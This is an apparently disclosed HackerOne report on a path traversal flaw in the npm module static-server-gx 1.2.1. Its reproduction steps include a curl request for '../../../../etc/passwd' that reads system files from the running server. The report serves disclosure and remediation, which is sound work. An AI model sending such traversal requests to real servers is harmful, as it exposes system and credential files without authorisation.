# [static-server-gx] Path Traversal allowing to read any files on the server

## Report Details
- **Report ID**: 581939
- **URL**: https://hackerone.com/reports/581939
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-05-16T04:34:07.806Z
- **Disclosed**: 2020-09-03T00:44:44.737Z

## Reporter
- **Username**: lightangel1412
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report path traversal vulnerability in module "static-server-gx"
It allows an attacker to read any files even system files via this path traversal vulnerability.

# Module

module name: static-server-gx
version: 1.2.1
npm page: https://www.npmjs.com/package/static-server-gx

# Module Description
N/A

# Module Stats
[21] downloads in the last week
[77] downloads in the last month

# Vulnerability

##Vulnerability Description
Path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.

##Steps To Reproduce:
- Install the module
```
npm install -g static-server-gx
```

- Run 'static-server-gx in "~/Desktop" directory:
```
nodejs /usr/lib/node_modules/static-server-gx/server.js 
```

- Use cURL to access etc/passwd file:
```
curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
```
{F491057}

## Patch
User input should be properly sanitized and filtered to remove dot-dot-slash (../)” sequences and its variations in path. 

## Supporting Material/References:
- Linux kali 4.15.0-kali2-amd64
- node 10.15.3
- npm 6.9
- Firefox ESR 52.7.3 (64-bit)

## Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It could have enabled an attacker to view system files and leverage attacks like remote code execution and so on.

## Attachments
- static-server-gx_-_PathTraversal.PNG
